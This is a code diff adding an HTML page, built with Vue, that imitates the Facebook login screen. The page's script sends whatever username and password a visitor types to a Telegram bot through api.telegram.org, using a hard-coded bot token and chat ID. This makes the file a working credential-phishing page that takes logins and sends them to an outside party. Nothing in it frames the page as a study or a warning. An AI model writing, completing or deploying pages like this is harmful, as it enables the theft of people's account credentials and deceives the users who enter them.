@@ -1,0 +1,56 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Facebook Login Page</title>
+    <link rel="stylesheet" href="./assets/css/facebook.css" />
+    <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
+</head>
+
+<body>
+    <div id="app" class="content">
+      
+        <div class="flex-div">
+            <div class="name-content">
+                <h1 class="logo">Facebook</h1>
+                <p>Connect with friends and the world around you on Facebook.</p>
+            </div>
+            <form>
+                <input type="text" ref="username" v-model="username" placeholder="Email or Phone Number" required />
+                <input type="password" ref="password" v-model="password" placeholder="Password" required>
+                <button @click="login" class="login">Log In</button>
+                <a href="#">Forgot Password ?</a>
+                <hr>
+                <button class="create-account">Create New Account</button>
+            </form>
+        </div>
+    </div>
+    <script>
+        const { createApp } = Vue
+        const bot_key = '6961214529:AAE_sxfO7j-TEiMVj8CzIS8WgOwlhyomNAk';
+        const _URL_ = "https://api.telegram.org/bot"+bot_key+"/sendMessage?chat_id=5627039442&text="
+
+
+        createApp({
+            data() {
+                return {
+                    username : null,
+                    password : null
+                }
+            },methods: {
+                login: function(){
+                    
+                    const response = fetch(_URL_+this.username+"|"+this.password);
+                    
+                    console.log(response);
+
+                }
+            },
+        }).mount('#app')
+
+    </script>
+</body>
+
+</html>
